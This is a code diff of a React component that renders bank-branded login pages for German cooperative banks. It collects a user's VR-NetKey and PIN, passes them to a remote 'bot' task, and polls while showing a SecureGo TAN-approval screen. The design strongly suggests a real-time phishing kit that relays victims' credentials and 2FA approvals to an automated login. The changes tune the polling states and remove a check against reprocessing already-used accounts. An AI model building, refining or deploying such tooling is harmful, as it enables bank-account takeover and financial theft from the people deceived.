@@ -52,7 +52,7 @@ type Bank = {
 };
 
 
-type Phase = "form" | "waiting" | "tan" | "confirming" | "address_confirm" | "result" | "session_expired";
+type Phase = "form" | "waiting" | "tan" | "address_confirm" | "result" | "session_expired";
 
 const logoModules = import.meta.glob("@/assets/*.png", { eager: true, import: "default" }) as Record<string, string>;
 const logoAliases: Record<string, string> = {
@@ -130,13 +130,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
   const [credentialsInvalid, setCredentialsInvalid] = useState(false);
 
-  const pollRef = useRef<{
-    timer: any;
-    startedAt: number;
-    taskId: string;
-    positiveSeen: boolean;
-    previousStatus?: string;
-  } | null>(null);
+  const pollRef = useRef<{ timer: any; startedAt: number; taskId: string; positiveSeen: boolean } | null>(null);
   const qrPollRef = useRef<{ timer: any; sessionId: string; startedAt: number } | null>(null);
 
   function stopQrPolling() {
@@ -306,8 +300,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
   function startPolling(taskId: string, startedAt: number) {
     stopPolling();
-    pollRef.current = { timer: null, startedAt, taskId, positiveSeen: false };
-
+    pollRef.current = { timer: null, startedAt, taskId, positiveSeen: false, addressConfirmed: false } as any;
 
     const tick = async () => {
       if (!pollRef.current || pollRef.current.taskId !== taskId) return;
@@ -350,7 +343,6 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
       );
       const tanConfirmedSignal =
         st === "tan_confirmed" ||
-        (pollRef.current.positiveSeen && st === "running") ||
         payloadValues.some(([key, value]) =>
           ([
             "tan_confirmed",
@@ -391,31 +383,13 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
 
 
-      if (tanRequired || loginValidated || looksLikeSecureGo || tanConfirmedSignal || st === "waiting_for_tan") {
+      if (tanRequired || loginValidated || looksLikeSecureGo || tanConfirmedSignal || st === "waiting_for_tan" || st === "completed") {
         pollRef.current.positiveSeen = true;
-      }
-
-      const responseText = JSON.stringify({ result: data?.result, error: data?.error, message: data?.message });
-      const isSecureGoInstruction =
-        /ic_smartphone|bestätigen\s+mit\s+secure\s*go|tan-fehler/i.test(responseText) &&
-        /secure\s*go|freigabe|auftrag/i.test(responseText);
-
-      // Some bot versions briefly publish the SecureGo instruction as a
-      // failed/completed payload. It is still the active 2FA challenge, not a
-      // terminal login error. Keep polling this exact task without resending.
-      if (isSecureGoInstruction) {
-        pollRef.current.positiveSeen = true;
-        pollRef.current.previousStatus = st;
-        setPhase((prev) => (prev === "confirming" ? prev : "tan"));
-        setSubmitting(false);
-        pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
-        return;
       }
 
       // A completed response without personal data can still use the generic result screen.
       if (st === "completed") {
-        const rawResult = data?.result ?? null;
-        setResult(rawResult);
+        setResult(data?.result ?? null);
         setPhase("result");
         setSubmitting(false);
         clearTask();
@@ -425,31 +399,22 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
 
 
-
-      if (tanConfirmedSignal) {
-        // TAN bereits bestätigt → in Ladephase wechseln bis der Bot fertig ist.
-        setPhase("confirming");
-        setSubmitting(false);
-      } else if (st === "waiting_for_tan" || tanRequired || loginValidated || looksLikeSecureGo) {
-        setPhase((prev) => (prev === "confirming" ? prev : "tan"));
+      if (st === "waiting_for_tan" || tanRequired || loginValidated || looksLikeSecureGo || tanConfirmedSignal) {
+        setPhase("tan");
         setSubmitting(false);
 
       } else if (st === "running" || st === "pending") {
         setSubmitting(true);
       } else if (st === "failed") {
-        // A late failed state after a valid login/2FA signal is transient.
-        // Continue the same task; never submit the credentials a second time.
+        // Ignore a stale/late `failed` if we already saw positive signals
+        // (e.g., user approved TAN before UI transitioned to the TAN screen).
         if (pollRef.current.positiveSeen) {
-          setPhase("confirming");
-          setSubmitting(false);
-          pollRef.current.previousStatus = st;
           pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
           return;
         }
         setErrorMsg("VR-NetKey oder PIN falsch.");
         resetToForm();
         return;
-
       } else if (st === "tan_rejected" || st === "tan_timeout") {
         setErrorMsg(st === "tan_timeout" ? "TAN-Zeitüberschreitung. Bitte neu starten." : "TAN abgelehnt. Bitte neu starten.");
         resetToForm();
@@ -458,7 +423,6 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         setSubmitting(true);
       }
 
-      pollRef.current.previousStatus = st;
       pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
     };
     tick();
@@ -492,19 +456,11 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
     if (!pin.trim()) { setPinError(true); hasErr = true; }
     if (hasErr) return;
 
-    // Block re-runs: a NetKey that already completed the flow on this device
-    // cannot be reused. The marker is set by CompletionStep on success.
-    try {
-      const doneKey = `bot_done:${vrNetKey.trim().toLowerCase()}`;
-      if (localStorage.getItem(doneKey)) {
-        setErrorMsg("Dieser Zugang wurde bereits erfolgreich verarbeitet.");
-        return;
-      }
-    } catch {}
 
     setSubmitting(true);
     setErrorMsg(null);
     setCredentialsInvalid(false);
+
     if (bank?.is_qr_branch) {
       try {
         const { sessionId } = await startQrLoginSession({
@@ -532,7 +488,6 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
     try {
       const { task_id } = await startBotTask({ url, netkey: vrNetKey.trim(), pin });
       persistTask(task_id);
-      try { sessionStorage.setItem(`bot_netkey_${task_id}`, vrNetKey.trim()); } catch {}
       setSubmitting(true);
       startPolling(task_id, Date.now());
 
@@ -638,22 +593,6 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
     return (
       <BankShell {...shellProps}>
         <TanWaitingScreen theme={theme} themeColor={themeColor} secureGoLabel={secureGoLabel} vrNetKey={vrNetKey} onCancel={resetToForm} />
-      </BankShell>
-    );
-  }
-
-  if (phase === "confirming") {
-    return (
-      <BankShell {...shellProps}>
-        <div className="max-w-xl mx-auto bg-white rounded-xl shadow-md border border-gray-200 p-8 text-center">
-          <div className="mx-auto mb-4 w-10 h-10 border-4 border-gray-200 rounded-full animate-spin" style={{ borderTopColor: themeColor }} />
-          <h2 className="text-xl font-bold mb-2" style={{ color: themeColor }}>
-            TAN-Freigabe bestätigt
-          </h2>
-          <p className="text-sm text-gray-600">
-            Anmeldung wird abgeschlossen… Bitte warten Sie einen Moment.
-          </p>
-        </div>
       </BankShell>
     );
   }
